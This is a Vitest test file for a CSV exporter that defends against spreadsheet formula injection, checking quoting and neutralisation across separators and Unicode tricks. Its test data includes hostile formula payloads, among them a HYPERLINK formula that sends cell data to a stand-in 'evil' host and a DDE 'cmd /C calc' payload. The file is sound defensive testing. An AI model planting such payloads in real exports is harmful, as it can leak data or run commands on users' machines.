import { describe, expect, it } from 'vitest'
import { CSV_BOM, csvBlob, csvCell, csvRow, neutraliseCsvValue } from './csv'

describe('csvCell — RFC 4180 quoting (byte-identical to the page exporters it replaced)', () => {
  it.each([
    ['plain', 'plain'],
    ['a,b', '"a,b"'],
    ['say "hi"', '"say ""hi"""'],
    ['two\nlines', '"two\nlines"'],
    ['cr\rhere', '"cr\rhere"'],
    ['', ''],
  ])('%j → %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected)
  })

  it('null and undefined are empty cells, never "null" or 0', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('numbers are written as JavaScript prints them', () => {
    expect(csvCell(0)).toBe('0')
    expect(csvCell(0.1 + 0.2)).toBe('0.30000000000000004')
    expect(csvCell(1234567)).toBe('1234567')
  })
})

describe('formula injection (OWASP) — every text cell starting with = + - @ TAB CR is inert', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1+1', "'+1+1"],
    ['-1+1', "'-1+1"],
    ['@SUM(A1:A2)', "'@SUM(A1:A2)"],
    // A TAB or CR is a place a new cell or row can start: the `'` goes after it
    // (and the field is quoted), so the cell split out there is text too.
    ['\t=1', '"\t\'=1"'],
    ['\r=1', '"\r\'=1"'],
    ['=HYPERLINK("http://evil/?"&A1,"click")', '"\'=HYPERLINK(""http://evil/?""&A1,""click"")"'],
    ['-A1', "'-A1"],
    ['- 5', "'- 5"],
    ['-5)', "'-5)"],
    ['+5', "'+5"],
    ['-', "'-"],
  ])('%j → %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected)
  })

  it('a leading character that is not a formula start is left alone', () => {
    expect(csvCell('a=1')).toBe('a=1')
    expect(csvCell('#comment')).toBe('#comment')
    expect(csvCell('test_x[1,-2]')).toBe('"test_x[1,-2]"')
    expect(csvCell('   ')).toBe('   ')
  })

  // The deliberate exception: a plain negative number stays a number, or
  // every negative delta in an export turns into text that no longer sums.
  it.each([-5, -0.25, -1e-7, -1234567])('the number %d stays a number', (value) => {
    expect(csvCell(value)).toBe(String(value))
  })

  it.each(['-5', '-0.25', '-.5', '-1e-7', '-12.', '-3E+4'])('the numeral string %j stays a number', (value) => {
    expect(neutraliseCsvValue(value)).toBe(value)
  })
})

/**
 * How a spreadsheet splits a CSV line into cells: on `separator` and on line
 * breaks, honouring a double quote ONLY when it opens a field (Excel and
 * LibreOffice both do this) — after a closing quote, the rest up to the next
 * separator is appended as is.
 */
function splitLikeASpreadsheet(text: string, separator: string): string[] {
  const cells: string[] = []
  let i = 0
  while (i <= text.length) {
    let cell = ''
    if (text[i] === '"') {
      i++
      while (i < text.length) {
        if (text[i] === '"' && text[i + 1] === '"') {
          cell += '"'
          i += 2
        } else if (text[i] === '"') {
          i++
          break
        } else cell += text[i++]
      }
    }
    while (i < text.length && text[i] !== separator && text[i] !== '\r' && text[i] !== '\n') cell += text[i++]
    cells.push(cell)
    if (text[i] === '\r' && text[i + 1] === '\n') i++
    i++
  }
  return cells
}

/** What the spreadsheet does with a cell's text: trims, folds, then looks at the first character. */
function evaluates(cell: string): boolean {
  if (/^-?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?$/.test(cell)) return false
  const seen = cell.normalize('NFKC').replace(/^["\s\p{Zs}\p{Cf}]+/u, '')
  return /^[=+\-@]/.test(seen)
}

describe('the `;` list-separator locales (review A6 / F9, CWE-1236)', () => {
  it.each([
    ['x;=1+1;', `"x;'=1+1;"`],
    [`x;=1+cmd|' /C calc'!A0`, `"x;'=1+cmd|' /C calc'!A0"`],
    ['a\t=1+1', `"a\t'=1+1"`],
    ['a;-1+1', `"a;'-1+1"`],
    ['x\n=1', `"x\n'=1"`],
    ['x; =1', `"x;' =1"`],
    ['x;"=1', `"x;'""=1"`],
    // A plain numeral after a separator is a number there too.
    ['a;-5', '"a;-5"'],
    // A separator with nothing formula-like after it is only quoted.
    ['a;b', '"a;b"'],
    ['tab\there', '"tab\there"'],
  ])('%j → %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected)
  })

  const HOSTILE = [
    'x;=1+1;',
    `x;=1+cmd|' /C calc'!A0`,
    'x;=HYPERLINK("http://evil/?"&A1,"click")',
    'a\t=1+1',
    'a;-1+1',
    'a;+1',
    'a;@SUM(A1)',
    'x\r\n=1',
    'x;\u00A0=1',
    'x;\u200B=1',
    'x;＝1',
    'x;"=1',
    'x;""=1',
    '=1',
    ' =1',
    '\uFEFF=1',
    '＋1',
  ]

  // Whatever the machine's separator, and wherever the field sits in the
  // line, no cell the spreadsheet ends up with starts a formula.
  for (const separator of [',', ';', '\t']) {
    it.each(HOSTILE)(`split on ${JSON.stringify(separator)}: %j never yields a cell that evaluates`, (hostile) => {
      for (const line of [csvRow(['benign', hostile, 'after']), csvRow([hostile, 'after'])]) {
        const bad = splitLikeASpreadsheet(line, separator).filter(evaluates)
        expect(bad, line).toEqual([])
      }
    })
  }

  it('the harness itself is not blind: the OLD writer fails it in a `;` locale', () => {
    // What csvCell did before: no `;` quoting, no segment neutralising.
    const old = (value: string) => (/[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value)
    const line = ['benign', old('x;=1+1;'), 'after'].join(',')
    expect(splitLikeASpreadsheet(line, ';').filter(evaluates)).toEqual(['=1+1'])
  })
})

describe('what a spreadsheet trims or folds before it looks (review A11)', () => {
  it.each([
    ['＝1+1', "'＝1+1"],
    ['＋1', "'＋1"],
    ['－1+1', "'－1+1"],
    ['＠SUM(A1)', "'＠SUM(A1)"],
    ['﹦1', "'﹦1"],
    [' =1', "' =1"],
    ['   +1', "'   +1"],
    ['\u00A0=1', "'\u00A0=1"],
    ['\u200B=1', "'\u200B=1"],
    ['\uFEFF=1', "'\uFEFF=1"],
    ['\u202E=1', "'\u202E=1"],
    ['\u2060@x', "'\u2060@x"],
    ['\n=1', `"\n'=1"`],
    // Not plain numerals in their RAW form, so neutralised.
    [' -5', "' -5"],
    ['－5', "'－5"],
  ])('%j → %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected)
  })

  it.each(['-5', '-0.25', '-1e-7'])('the numeral string %j still stays a number', (value) => {
    expect(csvCell(value)).toBe(value)
  })
})

describe('csvRow / csvBlob', () => {
  it('joins neutralised cells with commas', () => {
    expect(csvRow(['a', 1, null, '=x', 'b,c'])).toBe("a,1,,'=x,\"b,c\"")
  })

  it('the blob starts with a UTF-8 BOM and is typed text/csv', async () => {
    const blob = csvBlob('a,b\r\n')
    expect(blob.type).toBe('text/csv;charset=utf-8')
    const bytes = new Uint8Array(await blob.arrayBuffer())
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf])
    expect(CSV_BOM).toBe('\uFEFF')
  })
})
